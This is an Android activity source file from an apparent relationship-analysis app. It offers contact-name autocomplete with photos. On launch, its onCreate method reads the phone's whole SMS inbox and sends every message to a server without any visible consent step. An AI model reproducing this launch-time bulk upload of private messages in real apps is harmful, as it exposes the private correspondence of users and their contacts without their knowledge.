package hack.relationshit;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.InputMethodManager;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.AutoCompleteTextView;
import android.widget.ImageView;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

import hack.relationshit.http.Message;
import hack.relationshit.http.ServerDAO;
import hack.relationshit.utils.ImageHelper;


public class InitActivity extends FragmentActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_init);
        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction()
                    .add(R.id.container, new PlaceholderFragment())
                    .commit();
        }

        getActionBar().setDisplayShowCustomEnabled(true);
        getActionBar().setCustomView(R.layout.action_bar);
        getActionBar().setDisplayShowHomeEnabled(false);
        getActionBar().setDisplayShowTitleEnabled(false);
//
//        Typeface type = Typeface.createFromAsset(getAssets(), "fonts/homework.TTF");
//        ((TextView)getActionBar().getCustomView().findViewById(R.id.title)).setTypeface(type);

        ServerDAO.sendMessages(getMessages(), this);
    }

    @Override
    protected void onResumeFragments() {
        super.onResumeFragments();
        final Activity that = this;

        final ImageView erase = (ImageView) findViewById(R.id.erase);
        final AutoCompleteTextView contactName = (AutoCompleteTextView) findViewById(R.id.autoCompleteTextView);
        final ImageView imageView = (ImageView) that.findViewById(R.id.beloved_pic);


        Collection<String> contactNames = PhoneContact.getContactNames(this);
        String[] contactNamesArray = contactNames.toArray(new String[contactNames.size()]);

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, contactNamesArray);
        contactName.setAdapter(adapter);

        contactName.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                InputMethodManager inputMethodManager = (InputMethodManager)  that.getSystemService(Activity.INPUT_METHOD_SERVICE);
                inputMethodManager.hideSoftInputFromWindow(that.getCurrentFocus().getWindowToken(), 0);

                String name = parent.getItemAtPosition(position).toString();
                Bitmap image = PhoneContact.getImage(that, name);
                imageView.setImageBitmap(ImageHelper.getRoundedCornerBitmap(image,image.getHeight()/2));
                imageView.setVisibility(View.VISIBLE);
                erase.setVisibility(View.VISIBLE);
            }
        });

        erase.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN: {
                        erase.setImageResource(R.drawable.erase_pressed);
                    }
                    case MotionEvent.ACTION_UP: {
                        erase.setImageResource(R.drawable.erase);
                    }
                }
                return false;
            }
        });

        erase.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                contactName.setText("");
                imageView.setVisibility(View.INVISIBLE);
                erase.setVisibility(View.INVISIBLE);
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_init, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public void next(View view) {
        // TODO send personal info to server

        // on callback set flag

        final ShitApplication shit = (ShitApplication) this.getApplicationContext();
        shit.infoHasLoaded(this, false);
    }

    /**
     * A placeholder fragment containing a simple view.
     */
    public static class PlaceholderFragment extends Fragment {

        public PlaceholderFragment() {
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.fragment_init, container, false);
            return rootView;
        }
    }

    public Message[] getMessages() {

        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        List<Message> messages = new ArrayList<>();

        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                messages.add(new Message(this, cursor));
                cursor.moveToNext();
            }
        }

        cursor.close();
        return messages.toArray(new Message[messages.size()]);
    }

    @Override
    public void onBackPressed() {
        final ShitApplication shit = (ShitApplication) this.getApplicationContext();
        shit.resetState();

        super.onBackPressed();
    }
}
